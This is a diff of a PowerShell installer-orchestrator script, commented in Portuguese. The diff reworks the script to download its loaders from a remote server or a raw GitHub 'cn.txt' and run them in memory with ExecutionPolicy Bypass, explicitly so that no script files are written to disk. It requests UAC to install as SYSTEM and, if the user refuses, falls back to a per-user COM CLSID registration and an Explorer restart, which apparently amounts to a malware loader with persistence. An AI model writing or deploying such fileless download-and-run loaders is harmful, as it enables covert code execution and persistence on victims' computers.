@@ -4,36 +4,28 @@
     Orquestrador de install: tenta UAC (SYSTEM); se recusado, instala COM user (CLSID).
 
 .DESCRIPTION
-    NAO unifica os loaders. Delega para:
-      - install-system.ps1  (admin / servico)
-      - profile-cache.ps1   (user / COM HKCU)
+    NAO unifica os loaders. Delega para install-system / profile-cache via ScriptBlock
+    (irm em memoria — sem gravar .ps1 em disco).
     Fluxo Auto:
       1) Se ja admin -> SYSTEM
-      2) Senao pede UAC (RunAs) para install-system
+      2) Senao pede UAC (RunAs) e re-baixa este script elevado
       3) Se UAC cancelado (Nao) -> profile-cache Install + RestartExplorer
-    Os scripts filhos sao descarregados do mesmo /loaders se nao estiverem ao lado.
 
 .PARAMETER Config
     URL do JSON conf.cfg com { "server": "..." }.
 
-.PARAMETER Mode
-    Auto (default) | System | User — forca o path (System ainda pede UAC se nao admin).
+.PARAMETER ScriptUrl
+    URL deste orquestrador (para UAC re-baixar em memoria). Obrigatorio quando o
+    script nao esta em LoaderBase/install-auto.ps1 (ex.: raw GitHub cn.txt).
 
-.PARAMETER Clsid
-    Opcional; repassado ao profile-cache (auto CLSID se omitido).
-
-.PARAMETER Force
-    Repassado ao profile-cache Install.
-
-.PARAMETER SkipRestartExplorer
-    Nao passa -RestartExplorer no path user.
+.PARAMETER LoaderBase
+    Base dos loaders (default: origin de -Config + /loaders).
 
 .EXAMPLE
-    .\install-auto.ps1 -Config 'http://10.47.22.196:4000/conf.cfg'
+    & ([scriptblock]::Create((irm 'http://host:4000/loaders/install-auto.ps1'))) -Config 'http://host:4000/conf.cfg'
 
 .EXAMPLE
-    irm 'http://host:4000/loaders/install-auto.ps1' -OutFile install-auto.ps1
-    .\install-auto.ps1 -Config 'http://host:4000/conf.cfg'
+    $u='https://raw.githubusercontent.com/org/repo/main/cn.txt'; & ([scriptblock]::Create((irm $u))) -Config 'https://server.example/conf.cfg' -ScriptUrl $u
 #>
 [CmdletBinding()]
 param(
@@ -46,6 +38,8 @@ param(
     [string]$Clsid,
 
     [string]$LoaderBase,
+
+    [string]$ScriptUrl,
 
     [ValidateSet('Auto', 'x64', 'x86')]
     [string]$Architecture = 'Auto',
@@ -102,143 +96,135 @@ function Enable-Tls12 {
     }
 }
 
-function Ensure-SiblingLoader {
-    param(
-        [Parameter(Mandatory = $true)][string]$FileName,
-        [Parameter(Mandatory = $true)][string]$WorkDir,
-        [Parameter(Mandatory = $true)][string]$BaseUrl
-    )
-    $dest = Join-Path $WorkDir $FileName
-    if (Test-Path -LiteralPath $dest) {
-        return $dest
-    }
-    $url = "$BaseUrl/$FileName"
-    Enable-Tls12 $url
+function Get-RemoteScriptText {
+    param([Parameter(Mandatory = $true)][string]$Url)
+    Enable-Tls12 $Url
     $wc = New-Object Net.WebClient
     try {
-        $wc.DownloadFile($url, $dest)
+        return $wc.DownloadString($Url)
+    }
+    catch {
+        $detail = $_.Exception.Message
+        if ($_.Exception.InnerException) {
+            $detail = $_.Exception.InnerException.Message
+        }
+        throw "Falha ao descarregar script: $Url — $detail"
     }
     finally {
         $wc.Dispose()
     }
-    if (-not (Test-Path -LiteralPath $dest)) {
-        throw "Falha ao descarregar $url"
+}
+
+function Invoke-RemoteLoader {
+    param(
+        [Parameter(Mandatory = $true)][string]$Url,
+        [Parameter(Mandatory = $true)][hashtable]$BoundParams
+    )
+    $src = Get-RemoteScriptText -Url $Url
+    if ([string]::IsNullOrWhiteSpace($src)) {
+        throw "Script vazio: $Url"
     }
-    return $dest
+    # Versao antiga ainda tinha Ensure-SiblingLoader / DownloadFile — rejeitar cedo.
+    if ($src -match 'Ensure-SiblingLoader') {
+        throw "Loader antigo em $Url (Ensure-SiblingLoader). Actualize install-auto / cn.txt para a versao ScriptBlock."
+    }
+    $sb = [scriptblock]::Create($src)
+    & $sb @BoundParams
 }
 
 function Invoke-SystemInstall {
     param(
-        [string]$ScriptPath,
+        [string]$BaseUrl,
         [string]$ConfigUrl,
         [string]$Arch
     )
-    $args = @(
-        '-NoProfile',
-        '-ExecutionPolicy', 'Bypass',
-        '-File', $ScriptPath,
-        '-Action', 'Install',
-        '-Config', $ConfigUrl,
-        '-Architecture', $Arch
-    )
-    $p = Start-Process -FilePath (Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe') `
-        -ArgumentList $args -Wait -PassThru -NoNewWindow
-    if ($null -eq $p) { throw "Falha ao iniciar install-system.ps1" }
-    if ($p.ExitCode -ne 0) {
-        throw "install-system.ps1 saiu com codigo $($p.ExitCode)"
+    Invoke-RemoteLoader -Url "$BaseUrl/install-system.ps1" -BoundParams @{
+        Action       = 'Install'
+        Config       = $ConfigUrl
+        Architecture = $Arch
     }
 }
 
 function Invoke-UserInstall {
     param(
-        [string]$ScriptPath,
+        [string]$BaseUrl,
         [string]$ConfigUrl,
         [string]$Arch,
         [string]$TargetClsid,
         [bool]$DoForce,
         [bool]$RestartExplorer
     )
-    $argList = [System.Collections.Generic.List[string]]::new()
-    $argList.AddRange([string[]]@(
-            '-NoProfile',
-            '-ExecutionPolicy', 'Bypass',
-            '-File', $ScriptPath,
-            '-Action', 'Install',
-            '-Config', $ConfigUrl,
-            '-Architecture', $Arch
-        ))
-    if ($TargetClsid) {
-        $argList.Add('-Clsid')
-        $argList.Add($TargetClsid)
+    $p = @{
+        Action       = 'Install'
+        Config       = $ConfigUrl
+        Architecture = $Arch
     }
-    if ($DoForce) { $argList.Add('-Force') }
-    if ($RestartExplorer) { $argList.Add('-RestartExplorer') }
+    if ($TargetClsid) { $p.Clsid = $TargetClsid }
+    if ($DoForce) { $p.Force = $true }
+    if ($RestartExplorer) { $p.RestartExplorer = $true }
+    Invoke-RemoteLoader -Url "$BaseUrl/profile-cache.ps1" -BoundParams $p
+}
 
-    $p = Start-Process -FilePath (Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe') `
-        -ArgumentList $argList.ToArray() -Wait -PassThru -NoNewWindow
-    if ($null -eq $p) { throw "Falha ao iniciar profile-cache.ps1" }
-    if ($p.ExitCode -ne 0) {
-        throw "profile-cache.ps1 saiu com codigo $($p.ExitCode)"
-    }
+function Escape-SingleQuoted {
+    param([string]$Value)
+    if ($null -eq $Value) { return '' }
+    return ($Value -replace "'", "''")
 }
 
 function Try-ElevateSystemInstall {
     param(
-        [string]$SelfPath,
+        [string]$AutoUrl,
         [string]$ConfigUrl,
         [string]$Arch,
         [string]$Base,
         [string]$TargetClsid,
         [bool]$DoForce
     )
-    # Re-executa ESTE script elevado com -ElevatedSystem (filhos ja no disco / mesmo cwd).
     $ps = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe'
-    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$SelfPath`" -Config `"$ConfigUrl`" -Mode System -ElevatedSystem -Architecture $Arch"
-    if ($Base) { $arg += " -LoaderBase `"$Base`"" }
-    if ($TargetClsid) { $arg += " -Clsid `"$TargetClsid`"" }
-    if ($DoForce) { $arg += " -Force" }
+    $cfg = Escape-SingleQuoted $ConfigUrl
+    $au = Escape-SingleQuoted $AutoUrl
+    $bs = Escape-SingleQuoted $Base
+    $cmd = "& ([scriptblock]::Create((irm '$au'))) -Config '$cfg' -Mode System -ElevatedSystem -Architecture $Arch -LoaderBase '$bs' -ScriptUrl '$au'"
+    if ($TargetClsid) {
+        $cmd += " -Clsid '$(Escape-SingleQuoted $TargetClsid)'"
+    }
+    if ($DoForce) { $cmd += ' -Force' }
 
-    $p = Start-Process -FilePath $ps -ArgumentList $arg -Verb RunAs -Wait -PassThru
+    $p = Start-Process -FilePath $ps -ArgumentList @(
+        '-NoProfile',
+        '-ExecutionPolicy', 'Bypass',
+        '-Command', $cmd
+    ) -Verb RunAs -Wait -PassThru
     if ($null -eq $p) { throw "Start-Process RunAs devolveu null" }
     return [int]$p.ExitCode
 }
 
 # --- main ---
 
-$workDir = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
-$selfPath = $PSCommandPath
-if (-not $selfPath) { $selfPath = Join-Path $workDir 'install-auto.ps1' }
-
 $base = if ($LoaderBase) { $LoaderBase.TrimEnd('/') } else { Get-LoaderBaseFromConfig -ConfigUrl $Config }
-
-$systemPs = Ensure-SiblingLoader -FileName 'install-system.ps1' -WorkDir $workDir -BaseUrl $base
-$userPs = Ensure-SiblingLoader -FileName 'profile-cache.ps1' -WorkDir $workDir -BaseUrl $base
+$autoUrl = if ($ScriptUrl) { $ScriptUrl.Trim() } else { "$base/install-auto.ps1" }
 
 $restartExplorer = -not $SkipRestartExplorer.IsPresent
 $doForce = [bool]$Force
 
-# Path forcado User (filho imprime status final)
 if ($Mode -eq 'User') {
-    Invoke-UserInstall -ScriptPath $userPs -ConfigUrl $Config -Arch $Architecture `
+    Invoke-UserInstall -BaseUrl $base -ConfigUrl $Config -Arch $Architecture `
         -TargetClsid $Clsid -DoForce $doForce -RestartExplorer $restartExplorer
-    exit 0
+    return
 }
 
-# Path SYSTEM (ja elevado ou Mode=System/Auto com admin)
 if ($ElevatedSystem -or (Test-IsAdmin)) {
-    Invoke-SystemInstall -ScriptPath $systemPs -ConfigUrl $Config -Arch $Architecture
-    exit 0
+    Invoke-SystemInstall -BaseUrl $base -ConfigUrl $Config -Arch $Architecture
+    return
 }
 
-# Auto / System sem admin: pedir UAC
 if ($Mode -eq 'System' -or $Mode -eq 'Auto') {
     try {
-        $code = Try-ElevateSystemInstall -SelfPath $selfPath -ConfigUrl $Config -Arch $Architecture `
+        $code = Try-ElevateSystemInstall -AutoUrl $autoUrl -ConfigUrl $Config -Arch $Architecture `
             -Base $base -TargetClsid $Clsid -DoForce $doForce
         if ($code -eq 0) {
-            # Janela elevada e separada: status final no processo pai.
             Write-Host 'Instalado.'
-            exit 0
+            return
         }
         Write-Error "install SYSTEM falhou apos UAC (exit $code). Corrija e volte a tentar, ou use -Mode User."
         exit $code
@@ -249,9 +235,9 @@ if ($Mode -eq 'System' -or $Mode -eq 'Auto') {
                 Write-Error "UAC recusado e Mode=System; sem fallback."
                 exit 1223
             }
-            Invoke-UserInstall -ScriptPath $userPs -ConfigUrl $Config -Arch $Architecture `
+            Invoke-UserInstall -BaseUrl $base -ConfigUrl $Config -Arch $Architecture `
                 -TargetClsid $Clsid -DoForce $doForce -RestartExplorer $restartExplorer
-            exit 0
+            return
         }
         throw
     }
